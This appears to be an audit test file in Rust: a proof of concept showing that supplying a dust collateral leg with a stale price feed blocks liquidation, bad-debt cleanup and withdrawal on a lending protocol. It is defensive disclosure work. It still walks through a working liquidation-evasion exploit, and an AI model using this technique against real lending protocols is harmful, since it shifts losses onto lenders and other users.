//! Exploit proof: a stale-feed dust collateral leg planted via `supply` is a
//! permissionless liquidation shield. `supply` reads no price and enforces no
//! post-pool solvency gate, so the leg attaches even when its feed is already
//! unresolvable. Every later risk walk (`liquidate`, `clean_bad_debt`,
//! `withdraw`) then prices that leg unconditionally and reverts `PriceFeedStale`
//! before reaching the HF gate — vetoing loss mitigation on the whole account.

use test_harness::{
    errors, eth_preset, usd, usd_cents, usdc_preset, wbtc_preset, LendingTest, PositionType, ALICE,
    BOB, LIQUIDATOR,
};

/// Z = WBTC is a listed, single-source-priced, collateralizable asset. Its feed
/// is frozen (stale) while the account already carries debt; the attacker then
/// attaches a dust WBTC leg through `supply`, which succeeds despite the dead
/// feed, and thereby blocks liquidation + bad-debt cleanup + withdraw.
#[test]
fn audit_supply_setup_blocks_liquidation_via_stale_dust_leg() {
    let mut t = LendingTest::new()
        .with_market(usdc_preset()) // A: healthy collateral
        .with_market(eth_preset()) // B: borrowable
        .with_market(wbtc_preset()) // Z: thin, single-source collateral
        .with_dust_disabled_all_markets()
        .build();

    // Z is priced single-source spot — the mainnet strategy=0 RWA shape whose
    // one feed, once stale, has no anchor to fall back to.
    t.set_oracle_single_spot("WBTC");

    // --- Attacker account (ALICE) and a twin control account (BOB) --------
    // Identical debt posture; BOB will never receive the poisoned leg, isolating
    // the stale leg as the sole cause of the divergence below.
    t.supply(ALICE, "USDC", 10_000.0);
    t.borrow(ALICE, "ETH", 3.0); // ~$6000 debt vs $8000 weighted => healthy
    t.supply(BOB, "USDC", 10_000.0);
    t.borrow(BOB, "ETH", 3.0);

    // Sanity: the account is reachable and the risk walk works while fresh.
    let pre = t.try_liquidate(LIQUIDATOR, ALICE, "ETH", 1.0);
    test_harness::assert_contract_error(pre, errors::HEALTH_FACTOR_TOO_HIGH);

    // --- Freeze Z's feed -------------------------------------------------
    // Advance time (A and B stay fresh via the refresh), then re-write WBTC's
    // spot at a backdated timestamp: the entry is live at the current ledger,
    // but its price timestamp is 3600s old — well past the 900s window — so the
    // single-source read reverts `PriceFeedStale` (a publisher that stopped
    // updating while the ledger moved on).
    t.advance_time(5_000);
    let now = t.env.ledger().timestamp();
    let wbtc = t.resolve_asset("WBTC");
    t.mock_reflector_client()
        .set_price_at(&wbtc, &usd(60_000), &(now - 3_600));

    // --- KEY ASSERTION 1: the plant succeeds despite the dead feed --------
    let plant = t.try_supply(ALICE, "WBTC", 0.001);
    assert!(
        plant.is_ok(),
        "supply must accept the leg even though WBTC's feed is stale: {plant:?}"
    );
    t.assert_position_exists(ALICE, "WBTC", PositionType::Supply);
    assert!(
        t.supply_balance_raw(ALICE, "WBTC") > 0,
        "poisoned WBTC leg must persist with a non-zero scaled share"
    );

    // --- Drive the account underwater ------------------------------------
    // Crash A's price. Both ALICE and BOB become HF < 1; the only difference is
    // ALICE's unpriceable WBTC leg (worth ~$60, economically negligible).
    t.set_price("USDC", usd_cents(50));

    // Twin control: BOB (no stale leg) is genuinely liquidatable and liquidates.
    assert!(
        t.can_be_liquidated(BOB),
        "twin account must be underwater so the crash — not the leg — drives HF<1"
    );
    t.liquidate(LIQUIDATOR, BOB, "ETH", 1.0);
    assert!(
        t.borrow_balance(BOB, "ETH") < 3.0,
        "twin liquidation must succeed with fresh feeds"
    );

    let alice_id = t.resolve_account_id(ALICE);

    // --- KEY ASSERTION 2: liquidate is vetoed by the stale leg ------------
    // The revert is PriceFeedStale (walk dies pricing WBTC), NOT the ordinary
    // HealthFactorTooHigh — that is what makes this a shield, not a healthy acct.
    let liq = t.try_liquidate(LIQUIDATOR, ALICE, "ETH", 1.0);
    test_harness::assert_contract_error(liq, errors::PRICE_FEED_STALE);

    // --- KEY ASSERTION 3: bad-debt socialization is vetoed too ------------
    let clean = t.try_clean_bad_debt_by_id(alice_id);
    test_harness::assert_contract_error(clean, errors::PRICE_FEED_STALE);

    // --- KEY ASSERTION 4: the leg cannot be unwound ----------------------
    let wd = t.try_withdraw(ALICE, "WBTC", 0.0001);
    test_harness::assert_contract_error(wd, errors::PRICE_FEED_STALE);

    // --- Recovery leg: pin causation -------------------------------------
    // Re-stamp WBTC fresh. Nothing else changes. Liquidation now succeeds,
    // proving the stale leg — and only the stale leg — was the blocker.
    t.set_price("WBTC", usd(60_000));
    let recovered = t.try_liquidate(LIQUIDATOR, ALICE, "ETH", 1.0);
    assert!(
        recovered.is_ok(),
        "once WBTC is fresh again, the identical liquidation must succeed: {recovered:?}"
    );
    assert!(
        t.borrow_balance(ALICE, "ETH") < 3.0,
        "post-recovery liquidation must reduce ALICE's debt"
    );
}
